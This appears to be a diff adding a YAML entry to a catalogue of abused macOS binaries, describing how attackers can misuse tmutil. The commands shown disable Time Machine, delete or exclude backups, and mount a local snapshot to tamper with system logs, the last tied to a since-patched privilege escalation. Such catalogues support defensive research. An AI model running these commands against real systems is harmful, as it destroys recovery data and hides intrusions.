@@ -1,0 +1,62 @@
+name: tmutil
+author: Brendan Chamberlain (@infosecb)
+short_description: A tool for managing Time Machine backups.
+full_description: A tool for managing Time Machine, the native macOS backup utility. 
+created: 2023-05-01
+example_use_cases:
+- name: Disable Time Machine
+  description: The following command disables Time Machine. An attacker can use this to prevent backups from occurring.
+  code: tmutil disable
+  tactics:
+  - Impact
+  tags:
+  - backup
+- name: Delete a backup
+  description: The following command deletes the specified backup. An adversary may perform this action before launching a ransonware attack to prevent the victim from restoring their files.
+  code: tmutil delete /path/to/backup
+  tactics:
+  - Impact
+  tags:
+  - delete
+- name: Restore a backup
+  description: The following command restore the specified backup. An attacker can use this to restore a backup of a sensitive file that was deleted.
+  code: tmutil restore /path/to/backup
+  tactics:
+  - Collection
+  tags:
+  - restore
+- name: Tamper with system logs
+  description: An adversary can use the snapshot and restore commands together to tamper with system logs. This is fixed in macOS 10.15.4+.
+  code: >- 
+    mkdir /tmp/snapshot
+    
+    tmutil localsnapshot
+
+    tmutil listlocalsnapshots /
+
+    mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot
+
+    open /tmp/snapshot
+
+    sudo vim /var/log/system.log
+
+    tmutil restore com.apple.TimeMachine.2023-05-01-090000.local
+  tactics:
+  - Privilege Escalation
+  tags:
+  - unprivileged
+- name: Exclude path from backup
+  description: An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.
+  code: tmutil addexclusion /path/to/exclude
+  tactics:
+  - Defense Evasion
+  tags:
+  - backup
+paths:
+- /usr/bin/tmutil
+detections:
+- name: No detection content available
+  url: N/A
+resources:
+- name: mount_apfs TCC bypass and privilege escalation
+  url: https://theevilbit.github.io/posts/cve_2020_9771/
